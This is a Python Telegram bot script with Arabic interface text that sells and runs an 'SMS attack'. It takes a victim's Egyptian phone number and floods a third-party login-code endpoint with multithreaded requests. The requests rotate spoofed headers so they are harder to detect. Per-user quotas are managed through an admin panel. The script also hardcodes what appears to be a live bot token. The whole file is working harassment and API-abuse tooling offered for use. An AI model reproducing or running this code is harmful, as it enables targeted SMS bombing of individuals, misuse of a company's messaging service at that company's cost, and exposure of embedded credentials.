hereimport telebot
from telebot import types
import requests
import json
import time
import random
import string
import threading
from queue import Queue
import sqlite3
from datetime import datetime

# إعدادات البوت
BOT_TOKEN = "7654632262:AAH8VZp2u9QBZnUiHFGYrVV-RZnpJfPZafQ"
OWNER_ID = 2118176057
API_URL = "https://api.twistmena.com/music/Dlogin/sendCode"

bot = telebot.TeleBot(BOT_TOKEN)

# إعداد قاعدة البيانات
def init_db():
    conn = sqlite3.connect('bot_users.db', check_same_thread=False)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY,
                  username TEXT,
                  is_admin INTEGER DEFAULT 0,
                  numbers_limit INTEGER DEFAULT 3,
                  messages_limit INTEGER DEFAULT 100,
                  speed_limit INTEGER DEFAULT 10,
                  join_date TEXT)''')
    
    # إضافة الأونر
    c.execute('''INSERT OR IGNORE INTO users 
                 (user_id, username, is_admin, numbers_limit, messages_limit, speed_limit, join_date)
                 VALUES (?, ?, ?, ?, ?, ?, ?)''',
              (OWNER_ID, 'OWNER', 2, -1, -1, -1, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
    conn.commit()
    conn.close()

init_db()

# قفل للقاعدة
db_lock = threading.Lock()

# دوال قاعدة البيانات
def get_user(user_id):
    with db_lock:
        conn = sqlite3.connect('bot_users.db', check_same_thread=False)
        c = conn.cursor()
        c.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
        user = c.fetchone()
        conn.close()
        return user

def add_user(user_id, username):
    with db_lock:
        conn = sqlite3.connect('bot_users.db', check_same_thread=False)
        c = conn.cursor()
        c.execute('''INSERT OR IGNORE INTO users 
                     (user_id, username, is_admin, numbers_limit, messages_limit, speed_limit, join_date)
                     VALUES (?, ?, ?, ?, ?, ?, ?)''',
                  (user_id, username, 0, 3, 100, 10, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit()
        conn.close()

def update_user_limits(user_id, numbers=None, messages=None, speed=None):
    with db_lock:
        conn = sqlite3.connect('bot_users.db', check_same_thread=False)
        c = conn.cursor()
        if numbers is not None:
            c.execute('UPDATE users SET numbers_limit = ? WHERE user_id = ?', (numbers, user_id))
        if messages is not None:
            c.execute('UPDATE users SET messages_limit = ? WHERE user_id = ?', (messages, user_id))
        if speed is not None:
            c.execute('UPDATE users SET speed_limit = ? WHERE user_id = ?', (speed, user_id))
        conn.commit()
        conn.close()

def set_admin(user_id, is_admin):
    with db_lock:
        conn = sqlite3.connect('bot_users.db', check_same_thread=False)
        c = conn.cursor()
        c.execute('UPDATE users SET is_admin = ? WHERE user_id = ?', (is_admin, user_id))
        conn.commit()
        conn.close()

def get_all_users():
    with db_lock:
        conn = sqlite3.connect('bot_users.db', check_same_thread=False)
        c = conn.cursor()
        c.execute('SELECT * FROM users')
        users = c.fetchall()
        conn.close()
        return users

def get_server_stats():
    with db_lock:
        conn = sqlite3.connect('bot_users.db', check_same_thread=False)
        c = conn.cursor()
        c.execute('SELECT COUNT(*) FROM users')
        total_users = c.fetchone()[0]
        c.execute('SELECT COUNT(*) FROM users WHERE is_admin >= 1')
        total_admins = c.fetchone()[0]
        conn.close()
        return total_users, total_admins

# رسائل التنسيق
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36",
]

referers = ["https://www.google.com", "https://www.bing.com"]
origin_urls = ["https://www.example.com", "https://www.someotherdomain.com"]

def get_headers():
    return {
        "User-Agent": random.choice(user_agents),
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Referer": random.choice(referers),
        "Origin": random.choice(origin_urls),
    }

def random_string(length=6):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# نظام الإرسال
class SMSAttack:
    def __init__(self, number, sms_count, thread_count, chat_id):
        self.number = number
        self.sms_count = sms_count
        self.thread_count = thread_count
        self.chat_id = chat_id
        self.success_count = 0
        self.failure_count = 0
        self.lock = threading.Lock()
        
    def worker(self, queue):
        while True:
            task = queue.get()
            if task is None:
                break
            
            payload = json.dumps({"dial": task, "randomValue": random_string()})
            headers = get_headers()
            try:
                response = requests.post(API_URL, headers=headers, data=payload, timeout=10)
                with self.lock:
                    if response.status_code == 200:
                        self.success_count += 1
                    else:
                        self.failure_count += 1
            except:
                with self.lock:
                    self.failure_count += 1
            
            queue.task_done()
    
    def start_attack(self):
        task_queue = Queue()
        threads = []
        
        for i in range(self.thread_count):
            thread = threading.Thread(target=self.worker, args=(task_queue,))
            thread.start()
            threads.append(thread)
        
        for _ in range(self.sms_count):
            task_queue.put(self.number)
        
        task_queue.join()
        
        for _ in range(self.thread_count):
            task_queue.put(None)
        
        for thread in threads:
            thread.join()
        
        result_msg = f"✅ انتهى الهجوم!\n\n📊 النتائج:\n✔️ نجح: {self.success_count}\n❌ فشل: {self.failure_count}"
        bot.send_message(self.chat_id, result_msg)

# دالة لإنشاء لوحة المفاتيح
def create_main_keyboard(user_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    user = get_user(user_id)
    
    btn1 = types.KeyboardButton("⚡ بدء هجوم")
    btn2 = types.KeyboardButton("📊 حدودي")
    btn3 = types.KeyboardButton("ℹ️ المساعدة")
    
    if user and user[2] >= 1:  # إذا كان أدمن
        btn4 = types.KeyboardButton("👑 لوحة الأدمن")
        markup.add(btn1, btn2)
        markup.add(btn4, btn3)
    else:
        markup.add(btn1, btn2)
        markup.add(btn3)
    
    return markup

# الأوامر
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    username = message.from_user.username or "مجهول"
    
    user = get_user(user_id)
    if not user:
        add_user(user_id, username)
    
    welcome_msg = """🔥 Tool By N1
bot by: @N1_HUMEN

مرحباً بك في أداة الإرسال!

اختر ما تريد من القائمة أدناه ⬇️"""
    
    bot.send_message(message.chat.id, welcome_msg, reply_markup=create_main_keyboard(user_id))

# معالجة الرسائل النصية (الأزرار)
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    user_id = message.from_user.id
    text = message.text
    
    user = get_user(user_id)
    if not user:
        bot.reply_to(message, "❌ استخدم /start أولاً")
        return
    
    if text == "⚡ بدء هجوم":
        msg = bot.reply_to(message, "📞 أرسل رقم الهاتف (مثال: 01012345678)")
        bot.register_next_step_handler(msg, process_number, user)
    
    elif text == "📊 حدودي":
        limits_text = f"""📊 حدودك الحالية:

📱 الأرقام: {user[3] if user[3] != -1 else '∞'}
💬 الرسائل: {user[4] if user[4] != -1 else '∞'}
⚡ السرعة: {user[5] if user[5] != -1 else '∞'}/ثانية
📅 تاريخ الانضمام: {user[6]}"""
        bot.reply_to(message, limits_text)
    
    elif text == "ℹ️ المساعدة":
        help_text = """📖 المساعدة:

⚡ بدء هجوم - لبدء هجوم جديد
📊 حدودي - لمعرفة حدودك
👑 لوحة الأدمن - للأدمنز فقط
ℹ️ المساعدة - هذه الرسالة

🔥 Tool By N1
Dev: @N1_HUMEN"""
        bot.reply_to(message, help_text)
    
    elif text == "👑 لوحة الأدمن":
        if user[2] < 1:
            bot.reply_to(message, "❌ غير مسموح! هذا الزر للأدمنز فقط")
            return
        show_admin_panel(message)
    
    else:
        bot.reply_to(message, "❌ اختر من الأزرار أدناه", reply_markup=create_main_keyboard(user_id))

def show_admin_panel(message):
    user_id = message.from_user.id
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    if user_id == OWNER_ID:
        markup.add(
            types.InlineKeyboardButton("➕ إضافة أدمن", callback_data="add_admin"),
            types.InlineKeyboardButton("📊 حالة السيرفر", callback_data="server_stats")
        )
    
    markup.add(
        types.InlineKeyboardButton("⚙️ تعديل حدود مستخدم", callback_data="edit_limits"),
        types.InlineKeyboardButton("👥 قائمة المستخدمين", callback_data="list_users")
    )
    
    bot.send_message(message.chat.id, "👑 لوحة تحكم الأدمن", reply_markup=markup)

def process_number(message, user):
    number = message.text.strip()
    
    if not (number.startswith("01") and len(number) == 11 and number.isdigit()):
        bot.reply_to(message, "❌ الرقم غير صحيح! يجب أن يبدأ بـ 01 ويكون 11 رقم")
        return
    
    number = "2" + number
    msg = bot.reply_to(message, f"🔢 كم عدد الرسائل؟\n(الحد الأقصى: {user[4] if user[4] != -1 else 'لا محدود'})")
    bot.register_next_step_handler(msg, process_messages, user, number)

def process_messages(message, user, number):
    try:
        sms_count = int(message.text.strip())
        
        if user[4] != -1 and sms_count > user[4]:
            bot.reply_to(message, f"❌ تجاوزت الحد المسموح ({user[4]} رسالة)")
            return
        
        if sms_count <= 0:
            bot.reply_to(message, "❌ يجب أن يكون العدد أكبر من صفر")
            return
        
        msg = bot.reply_to(message, f"🚀 كم رسالة في الثانية؟\n(الحد الأقصى: {user[5] if user[5] != -1 else 'لا محدود'})")
        bot.register_next_step_handler(msg, process_speed, user, number, sms_count)
    except:
        bot.reply_to(message, "❌ أدخل رقم صحيح!")

def process_speed(message, user, number, sms_count):
    try:
        speed = int(message.text.strip())
        
        if user[5] != -1 and speed > user[5]:
            bot.reply_to(message, f"❌ تجاوزت الحد المسموح ({user[5]} في الثانية)")
            return
        
        if speed <= 0:
            bot.reply_to(message, "❌ يجب أن تكون السرعة أكبر من صفر")
            return
        
        bot.reply_to(message, "⚡ جاري بدء الهجوم...")
        
        attack = SMSAttack(number, sms_count, speed, message.chat.id)
        threading.Thread(target=attack.start_attack).start()
    except:
        bot.reply_to(message, "❌ أدخل رقم صحيح!")

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = call.from_user.id
    user = get_user(user_id)
    
    if not user or user[2] < 1:
        bot.answer_callback_query(call.id, "❌ غير مسموح!")
        return
    
    if call.data == "add_admin":
        if user_id != OWNER_ID:
            bot.answer_callback_query(call.id, "❌ للأونر فقط!")
            return
        msg = bot.send_message(call.message.chat.id, "أرسل ID المستخدم لإضافته كأدمن:")
        bot.register_next_step_handler(msg, process_add_admin)
    
    elif call.data == "server_stats":
        if user_id != OWNER_ID:
            bot.answer_callback_query(call.id, "❌ للأونر فقط!")
            return
        total_users, total_admins = get_server_stats()
        stats_text = f"""📊 حالة السيرفر:

👥 إجمالي المستخدمين: {total_users}
👑 الأدمنز: {total_admins}
🤖 البوت يعمل بشكل طبيعي ✅"""
        bot.send_message(call.message.chat.id, stats_text)
    
    elif call.data == "edit_limits":
        msg = bot.send_message(call.message.chat.id, "أرسل ID المستخدم:")
        bot.register_next_step_handler(msg, process_edit_limits)
    
    elif call.data == "list_users":
        users = get_all_users()
        user_list = "👥 قائمة المستخدمين:\n\n"
        for u in users[:20]:
            role = "👑" if u[2] == 2 else "⭐" if u[2] == 1 else "👤"
            user_list += f"{role} {u[1]} (ID: {u[0]})\n"
        bot.send_message(call.message.chat.id, user_list)

def process_add_admin(message):
    try:
        target_id = int(message.text.strip())
        user = get_user(target_id)
        
        if not user:
            bot.reply_to(message, "❌ المستخدم غير موجود في البوت")
            return
        
        set_admin(target_id, 1)
        update_user_limits(target_id, numbers=-1, messages=-1, speed=-1)
        bot.reply_to(message, f"✅ تم إضافة {target_id} كأدمن بنجاح!")
    except:
        bot.reply_to(message, "❌ ID غير صحيح!")

def process_edit_limits(message):
    try:
        target_id = int(message.text.strip())
        user = get_user(target_id)
        
        if not user:
            bot.reply_to(message, "❌ المستخدم غير موجود")
            return
        
        msg = bot.reply_to(message, "أرسل الحدود الجديدة بالصيغة:\nالرسائل,السرعة\n(مثال: 200,20)")
        bot.register_next_step_handler(msg, update_limits_final, target_id)
    except:
        bot.reply_to(message, "❌ ID غير صحيح!")

def update_limits_final(message, target_id):
    try:
        parts = message.text.strip().split(',')
        messages = int(parts[0])
        speed = int(parts[1])
        
        update_user_limits(target_id, messages=messages, speed=speed)
        bot.reply_to(message, f"✅ تم تحديث حدود المستخدم {target_id}")
    except:
        bot.reply_to(message, "❌ صيغة خاطئة!")

# بدء البوت
print("🔥 Tool By N1")
print("Dev: @N1_HUMEN")
print("🚀 Bot started successfully!")
bot.infinity_polling()
